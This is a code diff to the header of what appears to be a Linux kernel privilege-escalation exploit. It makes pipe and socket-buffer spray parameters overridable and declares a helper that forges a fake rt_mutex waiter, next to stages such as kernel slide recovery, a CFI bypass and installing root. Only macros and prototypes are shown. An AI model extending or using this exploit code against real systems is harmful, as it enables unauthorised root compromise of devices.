@@ -79,8 +79,12 @@
 
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define PIPE_CANDIDATE_PAGES 8
+#ifndef SKB_SEND_SIZE
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
+#endif
+#ifndef SKB_RECLAIM_SENDS
 #define SKB_RECLAIM_SENDS 4
+#endif
 #ifndef APP_SLIDE_RECLAIM_SENDS
 #define APP_SLIDE_RECLAIM_SENDS 16
 #endif
@@ -135,10 +139,12 @@
 #define PIPE_E_COUNT (PIPE_E_SLABS * PIPE_OBJS_PER_SLAB)
 #define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
 #define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
+#ifndef PIPE_MAX_ATTEMPTS
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define PIPE_MAX_ATTEMPTS 1
 #else
 #define PIPE_MAX_ATTEMPTS 12
+#endif
 #endif
 
 #define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
@@ -407,6 +413,16 @@ int repair_fake_fops_llseek(int fd);
 int restore_slide_boot_id(int fd);
 int install_child_root(int fd);
 int try_cfi_stage(void);
+
+
+
+void put_fake_waiter(unsigned char *payload, size_t waiter_off,
+                     uintptr_t tree_parent, uintptr_t tree_right,
+                     uintptr_t tree_left, uintptr_t pi_parent,
+                     uintptr_t pi_right, uintptr_t pi_left,
+                     uintptr_t task, uintptr_t lock,
+                     uint32_t priority);
+
 
 void init_ctx(struct mm_ctx *ctx, size_t cnt);
 void resize_pipe_slots(int pipefd[2], size_t slots);
